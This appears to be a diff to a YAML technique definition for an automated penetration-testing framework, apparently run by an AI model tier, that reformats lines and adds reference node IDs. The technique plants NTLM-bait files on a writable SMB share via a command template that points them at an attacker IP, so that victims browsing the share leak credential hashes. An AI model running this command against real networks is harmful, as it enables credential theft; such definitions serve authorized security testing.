@@ -7,8 +7,7 @@ preconditions:
 parameters:
   attacker_ip: from_engagement.attacker_ip
   share_path: from_engagement.target_share_path
-command_template: ntlm_theft -g all -s {attacker_ip} -f bait && smbclient {share_path}
-  -c 'put bait/*'
+command_template: ntlm_theft -g all -s {attacker_ip} -f bait && smbclient {share_path} -c 'put bait/*'
 parser: generic_parser
 expected_effects:
 - ntlm_bait_planted
@@ -17,8 +16,7 @@ falsifier:
   pattern: ACCESS_DENIED|share not writable|denied|put failed
   timeout: 30
 model_tier: haiku
-mechanism: 'Drop desktop.ini / .url / .lnk / .scf / SettingContent-ms files into a
-  writable
+mechanism: 'Drop desktop.ini / .url / .lnk / .scf / SettingContent-ms files into a writable
 
   share. When a victim browses the share, Explorer auto-fetches the embedded UNC
 
@@ -30,4 +28,21 @@ mechanism: 'Drop desktop.ini / .url / .lnk / .scf / SettingContent-ms files into
 references:
   ocd_mindmap: 'Branch 4: NTLM theft via file drops'
   hacktricks: windows-hardening/ntlm/places-to-steal-ntlm-creds.md
+  ocd_mindmap_node_ids:
+  - 05af50505c
+  - 28650fcf4e
+  - 3a474e7f9a
+  - 3cf99b3510
+  - 4996b99668
+  - 4a813f076f
+  - 4d2e81cfe3
+  - 4e7ae0f651
+  - 531d4d3ae2
+  - 64c66b25ca
+  - 76d882e407
+  - 7bccdef9a4
+  - 9d24a6572c
+  - adbb130513
+  - cda05d1a7b
+  - d618a4a7fe
 hacktricks_ref: windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
